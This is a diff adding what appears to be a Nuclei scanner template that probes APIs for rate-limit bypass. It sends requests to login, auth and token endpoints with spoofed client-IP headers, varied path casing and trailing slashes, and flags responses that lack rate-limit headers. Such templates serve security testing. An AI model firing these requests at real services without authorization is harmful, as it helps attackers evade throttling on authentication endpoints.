@@ -1,0 +1,56 @@
+id: api-rate-limit-bypass
+
+info:
+  name: API Rate Limit Bypass Techniques
+  author: REDHAVEN
+  severity: medium
+  description: |
+    Tests various techniques to bypass API rate limiting:
+    - X-Forwarded-For spoofing
+    - Case variation in endpoints
+    - Trailing slash manipulation
+  tags: api,rate-limit,bypass,custom
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/{{endpoint}}"
+      - "{{BaseURL}}/API/{{endpoint}}"
+      - "{{BaseURL}}/api/{{endpoint}}/"
+      - "{{BaseURL}}/Api/{{endpoint}}"
+    
+    headers:
+      X-Forwarded-For: "127.0.0.1"
+      X-Originating-IP: "127.0.0.1"
+      X-Remote-IP: "127.0.0.1"
+      X-Client-IP: "127.0.0.1"
+    
+    payloads:
+      endpoint:
+        - users
+        - user
+        - login
+        - auth
+        - token
+        - refresh
+    
+    attack: batteringram
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      
+      - type: word
+        part: header
+        words:
+          - "X-RateLimit-Remaining"
+        negative: true
+    
+    extractors:
+      - type: kval
+        kval:
+          - X-RateLimit-Limit
+          - X-RateLimit-Remaining
